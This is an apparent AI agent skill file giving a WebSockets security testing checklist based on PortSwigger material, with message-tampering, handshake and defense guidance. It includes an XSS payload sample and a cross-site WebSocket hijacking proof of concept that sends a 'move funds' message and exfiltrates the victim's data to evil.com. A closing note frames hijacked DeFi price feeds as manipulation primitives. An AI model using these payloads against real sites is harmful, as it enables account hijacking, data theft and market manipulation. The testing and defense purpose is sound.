---
name: offensive-websockets
description: "WebSockets security checklist: intercepting and modifying WS messages, replaying/generating messages, handshake manipulation (clone/reconnect with edited headers), message-content vulnerabilities (XSS, SQLi over WS), handshake vulnerabilities (header trust, session flaws, custom headers), cross-site WebSocket hijacking (CSRF on the handshake), and defense guidelines (wss, no user data in URL, CSRF-protect handshake, treat both directions as untrusted). Use when a target uses long-lived socket connections."
---

# SKILL: WebSockets Security

## Metadata
- **Skill Name**: websockets
- **Folder**: offensive-websockets
- **Source**: PortSwigger Web Security Academy — WebSockets (https://portswigger.net/web-security/websockets)

## Description
WebSockets security checklist: intercepting and modifying WS messages, replaying/generating messages, handshake manipulation (clone/reconnect with edited headers), message-content vulnerabilities (XSS, SQLi over WS), handshake vulnerabilities (header trust, session flaws, custom headers), cross-site WebSocket hijacking (CSRF on the handshake), and defense guidelines (wss, no user data in URL, CSRF-protect handshake, treat both directions as untrusted). Use when a target uses long-lived socket connections.

## Trigger Phrases
Use this skill when the conversation involves any of:
`websocket, ws, wss, socket hijacking, cross-site websocket, ws message tampering, ws handshake, live feed, chat socket, streaming data`

## Description (Full)
WebSockets provide long-lived, bidirectional connections initiated over HTTP. Virtually any web vulnerability that arises over HTTP can also arise over WebSockets — plus handshake-specific classes like cross-site WebSocket hijacking (CSRF against the handshake).

## Full Methodology

# WebSockets Security

## Shortcut

- Find WS usage: look for 101 Switching Protocols in history; identify message formats.
- Intercept and mutate messages in both directions (Burp Proxy → Repeater).
- If inputs are reflected to other users or persisted, run the normal injection catalog over WS.
- Test the handshake itself: clone/reconnect with edited headers; test cross-site hijacking with a CSRF-style PoC.

## Message manipulation

Most input-based WS vulnerabilities are found by tampering with message contents:

```json
{"message":"<img src=1 onerror='alert(1)'>"}
```

If the server stores/forwards it and a peer renders it — stored XSS over WS. The same logic covers SQLi, XXE, command injection where server code processes WS payloads with the usual sinks.

## Handshake manipulation

Sometimes you must edit the handshake (new attack surface, dropped connections, stale tokens). In Burp Repeater: connect/clone/reconnect with edited handshake headers. Handshake-borne vulnerabilities:

- Trust in HTTP headers for security decisions (`X-Forwarded-For` gating)
- Session handling flaws — the WS session context comes from the handshake request's session
- Attack surface from custom headers

## Cross-site WebSocket hijacking (CSWSH)

A CSRF attack against the handshake: if the handshake relies solely on cookies (no CSRF token, no Origin/Referer check), a malicious page can open a WS connection *as the victim*:

```html
<script>
var ws = new WebSocket('wss://vulnerable-website.com/chat');
ws.onopen = function() { ws.send('{"message":"move funds"}'); };
ws.onmessage = function(e) { fetch('//evil.com/log?d=' + e.data); };
</script>
```

The attacker both performs privileged actions and reads the victim's inbound data. Check whether `Origin` is validated and whether a token is required in the handshake.

## Defense guidelines

- Use `wss://` (TLS).
- Hard-code the WS endpoint URL; never include user-controllable data in it.
- CSRF-protect the handshake (token or Origin allow-list) — this defeats CSWSH.
- Treat data received over WS as untrusted in both directions (server-side and client-side input handling).

## Notes for the fleet

- Real-time price/oracle feeds over WS are common in DeFi stacks: a poisoned or hijacked feed is a price-manipulation primitive for the contracts that trust it.
- Fleet mapping: message-tampering over a socket ≈ mempool-level manipulation; handshake trust ≈ chain-id/origin binding on signed messages.
